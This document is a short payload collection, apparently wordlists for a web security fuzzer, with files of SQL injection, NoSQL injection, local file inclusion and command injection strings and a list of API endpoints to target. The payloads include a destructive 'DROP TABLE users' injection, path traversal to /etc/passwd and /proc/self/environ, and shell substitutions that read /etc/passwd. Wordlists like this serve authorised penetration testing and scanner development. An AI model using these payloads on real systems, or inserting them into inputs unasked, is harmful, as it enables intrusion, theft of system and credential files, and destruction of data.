# Fichier: payloads/sql.txt
# SQL injection payloads
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT NULL,NULL,NULL,NULL--
admin' --
' OR 1=1; --
' OR 'x'='x

# Fichier: payloads/nosql.txt
# NoSQL injection payloads
{"$gt": ""}
{"$ne": null}
{"$where": "return true"}
{"$regex": ".*"}
{"$exists": true}

# Fichier: payloads/lfi.txt
# Local File Inclusion payloads
../../../etc/passwd
../../windows/win.ini
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
C:\Windows\System32\drivers\etc\hosts

# Fichier: payloads/command.txt
# Command injection payloads
; ls -la
| whoami
`cat /etc/passwd`
$(cat /etc/passwd)
& ping -c 4 127.0.0.1
%0a ping -c 4 127.0.0.1

# Fichier: endpoints.txt
# API endpoints to test
/api/v1/users
/api/v1/auth/login
/api/v1/search
/api/v1/files
/api/v1/admin
/graphql